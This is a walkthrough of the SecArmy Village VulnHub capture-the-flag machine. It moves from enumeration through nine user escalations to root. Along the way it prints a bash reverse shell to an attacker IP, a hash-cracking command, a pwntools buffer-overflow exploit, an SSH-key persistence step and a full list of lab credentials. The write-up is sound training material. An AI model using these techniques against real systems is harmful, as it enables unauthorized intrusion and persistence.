# SecarmyVillage Giveaway - Vulnhub

### Step 0

First of all I must find the localhost IP Adress of the box. In order to do this we can login using `cero:svos`. In order to become more handy I will refer to the IP of the box as `svoc.htb`. 

### Initial port enum
Even though I could've just use `nestat -tulpn |grep LISTEN` I wanted to consider this box a remote one and started a brief nmap scan and found 4 ports: 21 (ftp), 22 (ssh), 80(web) and 1337 (???). 
```
nmap -sC -sV -oN nmap.all -p- -v svoc.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 18:45 EET
Nmap scan report for svoc.htb (192.168.0.113)
Host is up (0.00045s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.174
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2c:54:d0:5a:ae:b3:4f:5b:f8:65:5d:13:c9:ee:86:75 (RSA)
|   256 0c:2b:3a:bd:80:86:f8:6c:2f:9e:ec:e4:7d:ad:83:bf (ECDSA)
|_  256 2b:4f:04:e0:e5:81:e4:4c:11:2f:92:2a:72:95:58:4e (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Totally Secure Website
1337/tcp open  waste?
```

### Looking over FTP

As we can see from nmap we can login using anonymous:anonymous on ftp but unfortunetly there is nothing in there.

### Looking over port 80

Here we are greated with an interesting message that points to the first attack vector. So I've started gobuster using `gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://svoc.htb/ -o web.recon` and I got the `/anon` directory. 

```
/javascript (Status: 301)
/server-status (Status: 403)
/anon (Status: 301)
```

At a first glance here we can't see the credentials, but when we look over the source-code we get `<font color="white">uno:luc10r4m0n</font>`. Now we ssh into the box and we get the first flag: ***flag1{fb9e88}***

### Privesc to the second user

Along side the `flag1.txt` we have a `readme.txt` file that seems to have the second user password: `4b3l4rd0fru705`. Well now we just use `su dos`. In order to get the second flag we need to find the file that contains `a8211ac1853a1235d48829414626512a`. In order to do this we can run `grep -rnw 'files/' -e 'a8211ac1853a1235d48829414626512a'` and which produces the following output: `files/file4444.txt:52:a8211ac1853a1235d48829414626512a`.

The only thing that remains to do is cat the file4444.txt which will point us to file3131.txt. This file has at the end a base64 encoded string. If we just decode it, it won't work but it will point us to the idea that this is a zip archive. To get the output I've crafted this payload: `base64 -d string.txt > files.zip` and than just run `unzip files.zip`. Now we've got the second flag: ***flag2{624a21}***

### Privesc to the third user

Now we have 2 files that we didn't read: `/home/dos/1337.txt` and `challange2/todo.txt`. Combining the information from both files we know that we must abuse the service found at port 1337. So when we ncat to port 1337 using `echo "c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b" |ncat svoc.htb 1337` we get the following ouput

```
Welcome to SVOS Password Recovery Facility!
Enter the super secret token to proceed: 
Here's your login credentials for the third user tres:r4f43l71n4j3r0
```
So we got the third user. The third flag is: ***flag3{ac66cf}***.

### Privesc to the fourth user

This part seems to be a reverse binary challange. So I transfered the binary to my local machine using `nc <ip> 4242 < secarmy-village`. If we run strings against it we can't get anything usefull, so I tried ghidra but there was in vain. Here I've run out of ideas, but I had one last trick to try. I tought because ghidra can't find any functions it might've been obfuscated so I tried to run it and than find the something. I've installed peda on gdb and run the binary with `gdb secarmy-village`.  Now I tried to look again for strings using `find 'cuatro'` and it outputed the credentials. 
```gdb
gdb-peda$ r
Starting program: /root/Documents/svoc/secarmy-village 
[New LWP 9351]
[New LWP 9352]
[New LWP 9353]
[New LWP 9354]
Welcome .......Please enter the key ===>  

^C
Thread 1 "secarmy-village" received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
--more ouput--
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gdb-peda$ find 'cuatro'
Searching for 'cuatro' in: None ranges
Found 1 results, display max 1 items:
mapped : 0x7ffff7ffb0bb ("cuatro:p3dr00l1v4r3z")
```
Now I've headed over again to ssh and got the flag4: ***flag4{1d6b06}***.

### Privesc to fifth user

Acording to the `todo.txt` in the home directory of cuatro we must switch again to port 80, but this time at the follwing url `/justanothergallery`. This challange seems to be based upon reading qr codes from images. So I've downloaded all images inside `cuatro` folder using `for i in {0..69}; do curl http://svoc.htb/justanothergallery/qr/image-$i.png --output image-$i.png; done` and than run the following script 
```python
#!/usr/bin/python3
from pyzbar.pyzbar import decode
from PIL import Image

all_words=""
for i in range(0,69):
    all_words += decode(Image.open('cuatro/image-{}.png'.format(i)))[0].data.decode('utf-8')
    all_words += " "
print(all_words)
```
Which outputs this text:
```
Hello and congrats for solving this challenge, we hope that you enjoyed the challenges we presented so far. It is time for us to increase the difficulty level and make the upcoming challenges more challenging than previous ones. Before you move to the next challenge, here are the credentials for the 5th user: cinco:ruy70m35 head over to this user and get your 5th flag! goodluck for the upcoming challenges!
```
From which we get the fifth set of credentials. Now we head over to recieve the flag5: ***flag5{b1e870}***

### Privesc to sixth user

Well this was an easy challange becase all we were supposed to do was to find a "hidden" file outside the home so we run this command `find / -user cinco -type d 2>&1 | grep -v "Permission denied"` and without looking to indepth we get at the end the following directory `/cincos-secrets`. Here there are two more files: `hint.txt` and `shadow.bak`. The second one seems to have the hash only for the user `seis` so it seems a little to obvious that we need to crack it. So I saved it and run john `john -w=/usr/share/wordlists/rockyou.txt hash` which after a few seconds found `Hogwarts`. When we switch the user we get the flag6: ***flag6{779a25}***

### Privesc to user seven

We have another web exploit in order to privesc. So basically we head over to `/shellcmsdashboard` and find the credentials. The only way in which I found a way to get the credentials without bruteforce was to leak the sourcecode. So I did a cut against `/var/www/html/shellcmsdashboard/index.php` and got `admin:qwerty`. Well it outputs `head over to /aabbzzee.php`. Here when we try to run something like `id` it outputs `uid=33(www-data) gid=33(www-data) groups=33(www-data)` so let's craft a reverse shell. This is what I've ended up with: `bash -c 'bash -i >& /dev/tcp/192.168.0.174/9001 0>&1'`. 

Now we do have a shell as www-data. Here we can read the `readme9213.txt` document, after we give the proper permissions (chmod 750 readme9213.txt). Aparently in this folder we do have the credentials for user 7. Flag 7 is: ***flag7{d5c26a}***.

### Privesc to user eight

After all those challanges, we finally got a crypto one. Well this was a bit of a strech because it took me a few tried to write the correct script. But the idea was simple. We needed to XOR all the digits from the message.txt with the key.txt. I wrote the following script 

```python
#!/usr/bin/python3
from operator import xor

msg = [11,29,27,25,10,21,1,0,23,10,17,12,13,8]
decrypted = ""
for key in msg:
    decrypted += chr(xor(ord('x'),key))
print(decrypted)
```
Which when we run it outputs `secarmyxoritup`. So this must the password for the archive `password.zip`
```
siete@svos:~$ unzip password.zip 
Archive:  password.zip
[password.zip] password.txt password: 
 extracting: password.txt
```
And it worked. We got the password for the next user. Switching again,we get the flag8: ***flag8{5bcf53}***

### Privesc to user nine

Here we get a .pcap file, that's called very sugesitvely `keyboard.pcap`. I've downloaded it and imported into wireshark. There seems to be a lot of HTTP streams so I started to follow all of them until I reached and followed the stream between `3.134.39.220` and `192.168.1.109`. From this I've got a huge text that If we've looked inside we see `READING IS NOT IMPORTANT, HERE IS WHAT YOU WANT: "mjwfr?2b6j3a5fx/"`. This I think it's an encrypted string, another crypto challange. But there was an educated guess, because if the article was talking about QWERTY keyboards it must be something related to it. So I've headed up to [decode.fr](https://www.dcode.fr/keyboard-shift-cipher) and tried a bounch of combinations. I've prested up to `QWERTY` and run the automatic decryptor. At the second line I've got `nueve:355u4z4rc0` which are the credentials for the last user. I switched again and got the flag 9: ***flag9{689d3e}***

### Getting the root
After a fun 9 step privesc, I've got to the last step: a PWN Challange. This was one of few times when I did pwn and it was a huge issue. I spend almost 2 hours on this easy pwn. The thing that really helped my life was pwntools. I first downloaded the binary to my machine and opened it inside ghidra. Here I saw two things
```cpp
char local_28 [24];
long local_10;

if (local_10 == 0xcafebabe)
```
So if my two hours of googling were right, if `local_28` reaches an overflow the next bytes will be wrote on `local_10`. So we need to set the `local_10` using this technique to `0xcafebabe`. So the payload looks like `aaaaaaaaaaaaaaaaaaaaaaaa0xcafebabe`. Now who do I get a shell out of it? Well I knew there was a module called `pwntools` from LiveOverflow videos. At this link I've found a demo that needed a few changes [Writing exploit with pwntools](https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html). So I've came up with:
```python
#!/usr/bin/python3

from pwn import *
p = process("./orangutan")
payload  = b""
payload += b"A"*24
payload += p64(0xcafebabe)

p.sendline(payload)

p.interactive()
```

So I've uploaded it on the box, installed pwntools on remote and got a shell as root.
```bash
nueve@svos:~$ ./script.py 
[+] Starting local process './orangutan': pid 2766
[*] Switching to interactive mode
hello pwner 
pwnme if u can ;) 
$ id
uid=0(root) gid=0(root) groups=0(root),1009(nueve)
```

In order to get redundancy I've generated a new set of keys `ssh-keygen -t rsa -b 4096` and added the public key to `authorized_keys`. The root flag is: `flag10{33c9661bfd}`

```bash
root@svos:~# id; hostname; wc -c root.txt 
uid=0(root) gid=0(root) groups=0(root)
svos
200 root.txt
```

# Credentials
- uno:luc10r4m0n
- dos:4b3l4rd0fru705
- tres:r4f43l71n4j3r0
- cuatro:p3dr00l1v4r3z
- cinco:ruy70m35
- seis:Hogwarts
- siete:6u1l3rm0p3n473
- ocho:m0d3570v1ll454n4
- nueve:355u4z4rc0
- root:$6$CCeUHJlY$0ClpmtE5GMymUVUNpJCIFtlVW4XjqHLX2BXeQoKs0VFSzZBREW6rlQmG4YSzlvb4i47OtX3vZkzk2p5HIcvpS1 (uncracked)
